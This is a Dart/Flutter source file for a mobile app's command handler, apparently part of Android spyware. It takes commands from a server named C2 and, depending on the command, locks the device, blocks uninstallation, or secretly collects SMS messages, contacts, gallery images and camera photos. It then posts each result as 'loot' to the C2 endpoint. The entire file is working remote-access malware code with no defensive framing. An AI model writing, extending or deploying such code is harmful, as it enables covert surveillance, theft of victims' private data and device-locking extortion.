import 'dart:convert';
import 'package:http/http.dart' as http;
import 'package:shared_preferences/shared_preferences.dart';
import '../config.dart';
import 'native_bridge.dart';

class CommandHandler {
  static Future<void> handle(
      Map cmd, String devId, SharedPreferences prefs) async {
    final action = cmd['action'] as String;
    final id = cmd['id'];
    List data = [];

    switch (action) {
      case 'lock_v1':
        await prefs.setBool('lock_v1', true);
        await prefs.setBool('lock_v2', false);
        break;
      case 'lock_v2':
        await prefs.setBool('lock_v2', true);
        await prefs.setBool('lock_v1', false);
        break;
      case 'anti_uninstall':
        await prefs.setBool('anti_uninstall', true);
        break;
      case 'sadap_sms':
        data = await NativeBridge.getSms();
        break;
      case 'cek_kontak':
        data = await NativeBridge.getContacts();
        break;
      case 'cek_galeri':
        data = await NativeBridge.getGallery();
        break;
      case 'akses_kamera':
        final b64 = await NativeBridge.capturePhoto(true);
        if (b64.isNotEmpty) {
          data = [{'image': b64, 'timestamp': DateTime.now().toIso8601String()}];
        }
        break;
    }

    await http.post(
      Uri.parse('$C2/api/device/$devId/result'),
      headers: {'Content-Type': 'application/json'},
      body: jsonEncode({
        'id': id,
        'result': 'ok',
        'loot': data.isEmpty ? null : {'kind': action, 'data': data},
      }),
    );
  }
}